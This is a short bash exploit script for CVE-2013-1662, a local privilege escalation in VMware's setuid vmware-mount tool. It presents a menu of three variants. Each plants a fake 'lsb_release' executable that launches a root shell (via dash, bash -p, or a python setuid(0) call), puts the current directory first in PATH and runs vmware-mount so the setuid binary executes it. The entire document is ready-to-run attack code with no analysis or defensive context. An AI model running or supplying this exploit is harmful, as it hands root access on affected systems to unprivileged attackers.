#!/bin/bash

echo 'CVE-2013-1662 VMWare Setuid vmware-mount Unsafe popen(3)'
set -e

echo
echo "1. Exploit with dash"
echo "2. Exploit with bash"
echo "3. Exploit with python"
echo
echo -ne "Choice: "
read func

if [ "$func" -eq "1" ]
then
n=lsb_release;printf 'dash>`tty` 2>&1'>$n;chmod +x $n;PATH=.:$PATH vmware-mount
elif [ "$func" -eq "2" ]
then
n=lsb_release;printf 'bash -p >`tty` 2>&1'>$n;chmod +x $n;PATH=.:$PATH vmware-mount
elif [ "$func" -eq "3" ] 
then
n=lsb_release;echo python -c '"''import os;os.setuid(0);os.system('"'sh'"')''">`tty` 2>&1'>$n;chmod +x $n;PATH=.:$PATH vmware-mount
fi
